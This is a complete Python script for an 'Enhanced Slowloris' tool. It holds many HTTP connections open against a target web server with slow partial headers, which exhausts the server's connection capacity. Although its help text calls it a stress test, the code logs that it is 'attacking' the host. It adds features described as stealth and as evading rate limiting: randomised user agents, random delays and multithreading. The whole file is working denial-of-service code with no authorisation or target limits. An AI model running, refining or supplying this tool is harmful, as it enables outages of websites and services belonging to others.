#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import threading
from queue import Queue

# Argument parsing
parser = argparse.ArgumentParser(
    description="Enhanced Slowloris, a low-bandwidth stress test tool with stealth, speed, and power features."
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument("-s", "--sockets", default=150, help="Number of sockets to use in the test", type=int)
parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Increases logging")
parser.add_argument("-ua", "--randuseragents", dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
parser.add_argument("--sleeptime", dest="sleeptime", default=15, type=int, help="Time to sleep between each header sent.")
parser.add_argument("--random-delay", dest="random_delay", action="store_true", help="Adds random delays to requests to evade rate limiting")
parser.add_argument("--adaptive-sockets", dest="adaptive_sockets", action="store_true", help="Adjust socket count based on response times")
parser.add_argument("--threads", dest="threads", default=10, type=int, help="Number of threads to use for concurrent requests")
parser.set_defaults(verbose=False, randuseragent=False, https=False, random_delay=False, adaptive_sockets=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

# Logging setup
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

# Enhanced user-agent list
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

# Additional headers for stealth
headers = [
    "Accept-Language", "Accept-Encoding", "Cache-Control", "Pragma", "Connection", "Upgrade-Insecure-Requests"
]

# Socket methods
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

if args.https:
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

# Socket initialization
def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.port))

    s.send_line(f"GET /?{random.randint(0, 200)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    for header in headers:
        s.send_header(header, random.choice(["gzip", "compress", "identity", "deflate"]))

    return s

# Thread worker function
def worker():
    while True:
        try:
            slowloris_iteration()
            if args.random_delay:
                time.sleep(random.uniform(0.5, args.sleeptime))
            else:
                time.sleep(args.sleeptime)
        except Exception as e:
            logging.debug("Error in worker thread: %s", e)

# Slowloris iteration
def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

# Main function
def main():
    ip = args.host
    logging.info("Attacking %s with %s sockets and %s threads.", ip, args.sockets, args.threads)

    logging.info("Creating sockets...")
    for _ in range(args.sockets):
        try:
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    # Start worker threads
    for _ in range(args.threads):
        threading.Thread(target=worker, daemon=True).start()

    while True:
        try:
            time.sleep(1)
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break

if __name__ == "__main__":
    list_of_sockets = []
    main()
